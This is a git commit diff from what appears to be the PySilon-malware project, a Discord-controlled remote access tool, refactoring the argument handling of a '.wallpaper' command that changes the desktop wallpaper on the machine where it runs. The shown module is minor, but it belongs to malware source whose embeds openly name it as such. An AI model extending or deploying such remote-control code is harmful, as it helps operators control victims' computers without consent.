e5e4b99642dc4b75b9fe286e934839ac5fb3fb76
JuicyChann <nik.xeiladakis@gmail.com>
2023-11-29 19:46:07 +0200

    refactor argument handling

--- resources/features/wallpaper.py
+++ resources/features/wallpaper.py
@@ -5,17 +5,11 @@ from getpass import getuser
 import discord
 from discord.ext import commands
 
-# Annahme, dass 'client' bereits definiert ist
-
 @client.command(name="wallpaper")
-async def set_wallpaper(ctx):
+async def set_wallpaper(ctx, image_path=None):
     await ctx.message.delete()
 
-    if ctx.message.content.strip() == ".wallpaper":
-        embed = discord.Embed(title="📛 Error", description='`Syntax: .wallpaper <path/to/image> (also include the extension)`', colour=discord.Colour.red())
-        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-        await ctx.send(embed=embed)
-    else:
+    if image_path != None:
         image_path = ctx.message.content[11:]
         image_path = image_path.replace('\\', '/')
 
@@ -29,3 +23,7 @@ async def set_wallpaper(ctx):
             embed = discord.Embed(title="📛 Error", description='`File doesn\'t exist!`', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(title="📛 Error", description='`Syntax: .wallpaper <path/to/image>`', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        await ctx.send(embed=embed)
